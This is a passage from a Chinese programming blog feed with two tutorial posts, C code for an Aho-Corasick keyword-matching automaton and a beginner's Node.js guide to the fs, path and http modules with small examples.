title="代码实现"></a>代码实现</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALPHABET_SIZE 26    <span class="comment">//大小不一定26</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Trie 树节点结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">children</span>[<span class="title">ALPHABET_SIZE</span>];</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">fail</span>;</span></span><br><span class="line">    <span class="type">int</span> isEndOfWord;</span><br><span class="line">    <span class="type">int</span> depth;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 队列节点结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QueueNode</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">data</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QueueNode</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 队列结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Queue</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QueueNode</span>* <span class="title">front</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QueueNode</span>* <span class="title">rear</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建新的 Trie 节点</span></span><br><span class="line"><span class="keyword">struct</span> TrieNode* <span class="title function_">createTrieNode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">node</span> =</span> (<span class="keyword">struct</span> TrieNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> TrieNode));</span><br><span class="line">    <span class="keyword">if</span> (node) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ALPHABET_SIZE; i++) &#123;</span><br><span class="line">            node-&gt;children[i] = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        node-&gt;fail = <span class="literal">NULL</span>;</span><br><span class="line">        node-&gt;isEndOfWord = <span class="number">0</span>;</span><br><span class="line">        node-&gt;depth = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入字符串到 Trie 树</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(<span class="keyword">struct</span> TrieNode* root, <span class="type">const</span> <span class="type">char</span>* key)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">node</span> =</span> root;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; key[i] != <span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> index = key[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;children[index] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            node-&gt;children[index] = createTrieNode();</span><br><span class="line">        &#125;</span><br><span class="line">        node = node-&gt;children[index];</span><br><span class="line">        node-&gt;depth = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    node-&gt;isEndOfWord = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建AC自动机的失败指针</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildACAutomaton</span><span class="params">(<span class="keyword">struct</span> TrieNode* root)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Queue</span> <span class="title">queue</span> =</span> &#123;<span class="literal">NULL</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将根节点的子节点入队并设置失败指针为根节点</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ALPHABET_SIZE; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;children[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            enqueue(&amp;<span class="built_in">queue</span>, root-&gt;children[i]);</span><br><span class="line">            root-&gt;children[i]-&gt;fail = root;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!isEmpty(&amp;<span class="built_in">queue</span>)) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">current</span> =</span> dequeue(&amp;<span class="built_in">queue</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理当前节点的子节点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ALPHABET_SIZE; i++) &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">child</span> =</span> current-&gt;children[i];</span><br><span class="line">            <span class="keyword">if</span> (child != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                enqueue(&amp;<span class="built_in">queue</span>, child);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 设置失败指针</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">fail</span> =</span> current-&gt;fail;</span><br><span class="line">                <span class="keyword">while</span> (fail != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (fail-&gt;children[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        child-&gt;fail = fail-&gt;children[i];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    fail = fail-&gt;fail;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (fail == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    child-&gt;fail = root;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在文本中查找关键词</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">findKeywords</span><span class="params">(<span class="keyword">struct</span> TrieNode* root, <span class="type">const</span> <span class="type">char</span>* text)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">current</span> =</span> root;</span><br><span class="line">    <span class="type">int</span> charIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; text[i] != <span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> index = text[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span> (current-&gt;children[index] == <span class="literal">NULL</span> &amp;&amp; current != root) &#123;</span><br><span class="line">            current = current-&gt;fail;</span><br><span class="line">        &#125;</span><br><span class="line">        current = current-&gt;children[index];</span><br><span class="line">        <span class="keyword">if</span> (current == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            current = root;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">temp</span> =</span> current;</span><br><span class="line">        <span class="keyword">while</span> (temp != root) &#123;</span><br><span class="line">            <span class="keyword">if</span> (temp-&gt;isEndOfWord) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;关键词 \&quot;%.*s\&quot; 出现在位置 %d\n&quot;</span>, temp-&gt;depth, text + charIndex - temp-&gt;depth, charIndex - temp-&gt;depth);</span><br><span class="line">            &#125;</span><br><span class="line">            temp = temp-&gt;fail;</span><br><span class="line">        &#125;</span><br><span class="line">        charIndex++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入队操作</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">enqueue</span><span class="params">(<span class="keyword">struct</span> Queue* <span class="built_in">queue</span>, <span class="keyword">struct</span> TrieNode* data)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QueueNode</span>* <span class="title">newNode</span> =</span> (<span class="keyword">struct</span> QueueNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> QueueNode));</span><br><span class="line">    <span class="keyword">if</span> (newNode == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;内存分配失败\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    newNode-&gt;data = data;</span><br><span class="line">    newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isEmpty(<span class="built_in">queue</span>)) &#123;</span><br><span class="line">        <span class="built_in">queue</span>-&gt;front = newNode;</span><br><span class="line">        <span class="built_in">queue</span>-&gt;rear = newNode;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">queue</span>-&gt;rear-&gt;next = newNode;</span><br><span class="line">        <span class="built_in">queue</span>-&gt;rear = newNode;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 出队操作</span></span><br><span class="line"><span class="keyword">struct</span> TrieNode* <span class="title function_">dequeue</span><span class="params">(<span class="keyword">struct</span> Queue* <span class="built_in">queue</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isEmpty(<span class="built_in">queue</span>)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;队列为空\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QueueNode</span>* <span class="title">frontNode</span> =</span> <span class="built_in">queue</span>-&gt;front;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">data</span> =</span> frontNode</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Node.js</title>
      <link href="/2023/09/03/node-js/"/>
      <url>/2023/09/03/node-js/</url>
      
        <content type="html"><![CDATA[<h1 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h1><h5 id="初识Node-js"><a href="#初识Node-js" class="headerlink" title="初识Node.js"></a>初识Node.js</h5><h6 id="浏览器中的JS"><a href="#浏览器中的JS" class="headerlink" title="浏览器中的JS"></a>浏览器中的JS</h6><ul><li>JS核心语法：变量，数据类型，分支，循环，判断，函数，作用域···</li><li>WebAPI：DOM操作，BOM操作，基于XMLHttpRequest的Ajax操作···</li></ul><p><strong>为什么浏览器可以运行js？</strong> —-&gt;浏览器通过使用JavaScript解析引擎来对js代码进行解析</p><p>不同的浏览器使用不同的JavaScript解析引擎：</p><ul><li>Chrome &#x3D;》 V8</li><li>Firefox &#x3D;》 OdinMonkey(奥丁猴)</li><li>Safri浏览器 &#x3D;》 JSCore</li><li>IE浏览器 &#x3D;》 Chakra （查克拉）</li><li>··· 在这些解析引擎中，V8解析引擎的性能是最好的！</li></ul><p><strong>为什么JS可以操作DOM和BOM？</strong> —-&gt;每个浏览器内置了DOM、BOM这样的API函数</p><h6 id="JS运行环境"><a href="#JS运行环境" class="headerlink" title="JS运行环境"></a>JS运行环境</h6><p>以Chrome浏览器为例：</p><ul><li>V8引擎【负责解析和执行JavaScript代码】</li><li>DOM、BOM等内置API模块【API是由运行环境提供的特殊接口，只能在所属的运行环境中被调用】</li></ul><p><strong>如果把JS写在前端，运行在浏览器中，此时JS可以做前端开发。而如果把JS代码写在Node.js中，JS同样可以做后端开发。</strong></p><h6 id="Node-js-1"><a href="#Node-js-1" class="headerlink" title="Node.js"></a>Node.js</h6><p>Node.js is a JavaScript runtime built on Chrome’s V8 JavaScript engine.[Node.js是一个基于Chrome V8引擎的JavaScript运行时]</p><p>Node.js运行环境：</p><ul><li>V8引擎【负责解析和执行JavaScript代码】</li><li>fs、path、http、JS内置对象、querystring等内置API模块【<strong>和浏览器的哪些内置模块不同</strong>】 这也是学习的重点，Node.js中也无法电泳DOM等浏览器内置API</li></ul><h5 id="fs文件系统模块"><a href="#fs文件系统模块" class="headerlink" title="fs文件系统模块"></a>fs文件系统模块</h5><p>fs是Node.js官方提供的、用来操作文件的模块，它提供了一系列的方法和属性，用来满足用户对文件的操作需求。</p><p>例如：</p><ul><li>fs.readFile()方法，用来读取指定文件中的内容</li><li>fs.writeFile()方法，用来向指定文件中写入内容</li></ul><p>如果要在JS代码中使用这个模块，需要先导入它：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conts fs = require(&#x27;fs&#x27;)</span><br></pre></td></tr></table></figure><h6 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fs.readFile(path[,options],callback)</span><br><span class="line">参数1：path，必选，字符串，表示文件路径</span><br><span class="line">参数2：options，可选，表示以什么编码格式来读取文件</span><br><span class="line">参数3：callback，必选，文件读取完成后，通过回调函数拿到读取结果</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//e.g:以utf8的形式，读取1.txt文件内容，并打印err和dataStr的值</span><br><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">fs.readFile(&#x27;./file/1.txt&#x27;,&#x27;utf8&#x27;,function(err,dataStr)&#123;</span><br><span class="line">    console.log(err)</span><br><span class="line">    console.log(&#x27;---&#x27;)</span><br><span class="line">    console.log(dataStr)</span><br><span class="line">&#125;)</span><br><span class="line">//改进</span><br><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">fs.readFile(&#x27;./file/1.txt&#x27;,&#x27;utf8&#x27;,function(err,dataStr)&#123;</span><br><span class="line">    if(err)&#123;</span><br><span class="line">        return console.log(&#x27;文件读取失败&#x27;+err.message)</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        console.log(&#x27;文件读取成功&#x27;+dataStr)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h6 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fs.writeFile(file,data[,option],callback)</span><br><span class="line">参数1：必选，字符串，文件路径</span><br><span class="line">参数2；必选，写入内容</span><br><span class="line">参数3：可选，编码格式，默认utf8</span><br><span class="line">参数4：必选，回调函数</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//e.g</span><br><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">fs.writeFile(&#x27;./file/2.txt&#x27;,&#x27;hhh&#x27;,function(err)&#123;</span><br><span class="line">    if(err)&#123;</span><br><span class="line">        return console.log(&#x27;文件写入失败&#x27;+err)</span><br><span class="line">    &#125;</span><br><span class="line">    console.log(&#x27;文件写入成功&#x27;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h6 id="实例：数据处理"><a href="#实例：数据处理" class="headerlink" title="实例：数据处理"></a>实例：数据处理</h6><p>要求：读取文件，将格式修改的更加美观</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">fs.readFile(&#x27;./file/test.txt&#x27;,&#x27;utf8&#x27;,function(err,dataStr)&#123;</span><br><span class="line">    if(err)&#123;</span><br><span class="line">        return console.log(&#x27;文件查看失败&#x27;+err.message)</span><br><span class="line">    &#125;</span><br><span class="line">    const arrOld = dataStr.split(&#x27; &#x27;)</span><br><span class="line">    const arrNew = []</span><br><span class="line">    arrOld.forEach(item=&gt;&#123;</span><br><span class="line">        arrNew.push(item.replace(&#x27;=&#x27;,&#x27;:&#x27;))</span><br><span class="line">    &#125;)</span><br><span class="line">    const newStr = arrNew.join(&#x27;\r\n&#x27;)</span><br><span class="line">    //console.log(newStr)</span><br><span class="line">    fs.writeFile(&#x27;./file/test_1.txt&#x27;,newStr,function(err)&#123;</span><br><span class="line">                 if(err)&#123;</span><br><span class="line">                        return console.log(&#x27;文件写入失败&#x27;+err.message)</span><br><span class="line">                    &#125;</span><br><span class="line">                console.log(&#x27;文件写入成功&#x27;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>注意：建议使用<strong>__dirname</strong>来拼接路径[ ‘ __dirname ‘ 表示执行命令的文件所在的路径]</p><h5 id="path路径模块"><a href="#path路径模块" class="headerlink" title="path路径模块"></a>path路径模块</h5><p>path模块是Node.js官方提供的、用来处理路径的模块。它提供了一系列的方法和属性，用来满足用户对零的处理需求。</p><p>例如：</p><ul><li>path.join()方法，用来将多个路径片段拼接成一个完整的路径字符串</li><li>path.basename()方法，用来从路径字符串中经，将文件名解析出来</li></ul><h6 id="拼接文件路径"><a href="#拼接文件路径" class="headerlink" title="拼接文件路径"></a>拼接文件路径</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const path = require(&#x27;path&#x27;)</span><br><span class="line">const pathStr = path.join(&#x27;/a&#x27;,&#x27;/b/c&#x27;,&#x27;../&#x27;,&#x27;./d&#x27;,&#x27;e&#x27;)</span><br><span class="line">console.log(pathStr)  //输出\a\b\d\e</span><br><span class="line"></span><br><span class="line">const pathStr2 = path.join(__dirname,&#x27;./file/1.txt&#x27;)    </span><br></pre></td></tr></table></figure><h6 id="获取文件名"><a href="#获取文件名" class="headerlink" title="获取文件名"></a>获取文件名</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const path = require(&#x27;path&#x27;)</span><br><span class="line"></span><br><span class="line">const fpath = &#x27;/a/b/c/index.html&#x27;</span><br><span class="line">    //只传一个参数</span><br><span class="line">var fullName = path.basename(fpath)</span><br><span class="line">console.log(fullName)   //index.html</span><br><span class="line">    //去掉文件后缀名</span><br><span class="line">var nameWithoutExt = path.basename(fpath,&#x27;.html&#x27;)</span><br><span class="line">console.log(nameWithoutExt)   //index</span><br></pre></td></tr></table></figure><p>获取文件扩展名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const path = require(&#x27;path&#x27;)</span><br><span class="line">const fpath = &#x27;/a/b/c/index.html&#x27;</span><br><span class="line">const fext = path.extname(fpath)</span><br><span class="line">console.log(fext)</span><br></pre></td></tr></table></figure><h5 id="http模块"><a href="#http模块" class="headerlink" title="http模块"></a>http模块</h5><p>http模块是Node.js官方提供的、用来创建web服务器的模块。通过http模块提供的http.createServer()方法，就可以很方便的对外提供web服务。</p><p>在Node.js中，我们不需要使用IIS、apache等第三方web服务器软件。因为我们可以基于Node.js提供的http模块，通过几行简单的代码，就能轻松的手写一个服务器软件，从而对外提供web服务</p><h6 id="创建web服务"><a href="#创建web服务" class="headerlink" title="创建web服务"></a>创建web服务</h6><ul><li>导入http模块</li><li>创建web服务器实例</li><li>为服务器绑定request事件，监听客户端的请求</li><li>启动服务器</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">const http = require(&#x27;http&#x27;)</span><br><span class="line"></span><br><span class="line">//使用服务器实例的on()方法，为服务器绑定一个request事件</span><br><span class="line">server.on(&#x27;request&#x27;,(req,res)=&gt;&#123;</span><br><span class="line">    //只要有客户端来请求我们的服务器，就会触发request事件，从而调用这个事件处理函数</span><br><span class="line">    console.log(&#x27;someone visit our web server&#x27;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">//调用服务器实例的listen()方法，即可启动当前的web服务器实例</span><br><span class="line">server.listen(80,() =&gt; &#123;</span><br><span class="line">    console.log(&#x27;http server running at http://127.0.0.1:80&#x27;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">1.导入http模块</span><br><span class="line">2.创建web服务器实例</span><br><span class="line">3.为服务器绑定request事件，监听客户端的请求</span><br><span class="line">4.启动服务器</span><br><span class="line">*/</span><br><span class="line">//1.导入http模块</span><br><span class="line">const http = require(&#x27;http&#x27;)</span><br><span class="line">//2.创建web服务器实例</span><br><span class="line">const server = http.createServer()</span><br><span class="line">//3.为服务器绑定request事件，监听客户端的请求</span><br><span class="line">server.on(&#x27;request&#x27;,function(req,res)&#123;</span><br><span class="line">    console.log(&#x27;someone visit our web server&#x27;)</span><br><span class="line">&#125;)</span><br><span class="line">//4.启动服务器</span><br><span class="line">server.listen(8081,function()&#123;</span><br><span class="line">    console.log(&#x27;http server running at http://127.0.0.1:8081&#x27;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h6 id="req请求对象"><a href="#req请求对象" class="headerlink" title="req请求对象"></a>req请求对象</h6><p>只要服务器接收到了客户端的请求，就会调用通过server.on()为服务器绑定的request事件处理函数。如果想在事件处理函数中，访问与客户端相关的数据或属性，可以使用如下的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">const http = require(&#x27;http&#x27;)</span><br><span class="line">const server = http.createServer()</span><br><span class="line">server.on(&#x27;request&#x27;,(req =&gt;&#123;</span><br><span class="line">    //req是请求对象，它包含了与客户端相关的数据和属性，例如：</span><br><span class="line">    //req.url是客户端请求的url地址</span><br><span class="line">    //req.method是客户端的method请求类型</span><br><span class="line">    const url = req.url</span><br><span class="line">    const method = req.method</span><br><span class="line">    //const str = &#x27;Your request url is&#x27;+url+&#x27;,and request method is &#x27;+method</span><br><span class="line">    const str = `Your request url is$&#123;url&#125;,and request method is $&#123;method&#125;`    //反引号!!!</span><br><span class="line">    console.log(str)</span><br><span class="line">&#125;))</span><br><span class="line">server.listen(8081,function()&#123;</span><br><span class="line">    console.log(&#x27;http server running at http://127.0.0.1:8081&#x27;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h6 id="res响应对象"><a href="#res响应对象" class="headerlink" title="res响应对象"></a>res响应对象</h6><p>在服务器的request事件处理函数中，如果想访问与服务器相关的数据或属性，可以使用如下方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 